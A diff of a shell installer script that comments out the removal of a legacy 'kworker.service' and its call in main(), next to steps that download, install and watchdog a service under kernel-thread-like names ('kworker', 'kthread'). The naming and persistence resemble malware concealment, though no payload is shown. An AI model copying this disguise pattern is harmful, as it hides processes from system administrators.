@@ -125,16 +125,16 @@ WATCH_EOF
     print_success "kthread directory ready"
 }
 
-remove_old_kworker_service() {
-    print_info "Removing legacy kworker.service if present..."
-    if systemctl list-unit-files kworker.service >/dev/null 2>&1; then
-        systemctl stop kworker.service >/dev/null 2>&1 || true
-        systemctl disable kworker.service >/dev/null 2>&1 || true
-    fi
-    [ -f /etc/systemd/system/kworker.service ] && rm -f /etc/systemd/system/kworker.service
-    systemctl daemon-reload >/dev/null 2>&1 || true
-    print_success "Legacy kworker.service removed"
-}
+# remove_old_kworker_service() {
+#     print_info "Removing legacy kworker.service if present..."
+#     if systemctl list-unit-files kworker.service >/dev/null 2>&1; then
+#         systemctl stop kworker.service >/dev/null 2>&1 || true
+#         systemctl disable kworker.service >/dev/null 2>&1 || true
+#     fi
+#     [ -f /etc/systemd/system/kworker.service ] && rm -f /etc/systemd/system/kworker.service
+#     systemctl daemon-reload >/dev/null 2>&1 || true
+#     print_success "Legacy kworker.service removed"
+# }
 
 install_kthread_service() {
     print_info "Installing ${SERVICE_NAME}.service..."
@@ -259,7 +259,7 @@ main() {
     download_and_extract
     setup_kworker_permissions
     setup_kthread_directory
-    remove_old_kworker_service
+    # remove_old_kworker_service
     install_kthread_service
     if ! install_cron_watchdog; then
         install_watchdog_fallback || print_warn "No cron and no watchdog unit; relying on systemd Restart=always"
